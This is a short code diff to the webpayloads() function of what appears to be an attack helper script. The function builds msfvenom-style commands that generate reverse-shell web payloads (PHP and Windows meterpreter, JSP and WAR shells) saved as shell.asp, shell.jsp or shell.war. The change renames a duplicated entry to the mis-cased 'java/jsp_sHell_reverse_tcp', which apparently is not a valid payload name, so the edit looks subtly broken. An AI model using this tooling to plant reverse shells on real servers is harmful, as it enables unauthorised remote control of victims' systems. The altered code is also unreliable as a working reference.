@@ -112,7 +112,7 @@ def webpayloads():
 *                                                                    *
 **********************************************************************
 """)
-	opt = ["php/meterpreter_reverse_tcp", "windows/meterpreter/reverse_tcp", "java/jsp_shell_reverse_tcp", "java/jsp_shell_reverse_tcp"]
+	opt = ["php/meterpreter_reverse_tcp", "windows/meterpreter/reverse_tcp", "java/jsp_shell_reverse_tcp", "java/jsp_sHell_reverse_tcp"]
 	op = int(input ("Select the input: "))
 	payload = str(opt[op-1])
 	gpa = payload
@@ -122,7 +122,7 @@ def webpayloads():
 		payload = ' -p '+payload + ' -f asp > shell.asp'
 	elif payload == 'java/jsp_shell_reverse_tcp':
 		payload = ' -p '+payload + ' -f raw > shell.jsp'
-	elif payload ==	'java/jsp_shell_reverse_tcp':
+	elif payload ==	'java/jsp_sHell_reverse_tcp':
 		payload = ' -p '+payload + ' -f war > shell.war'
 	return payload,gpa
 def scripting():
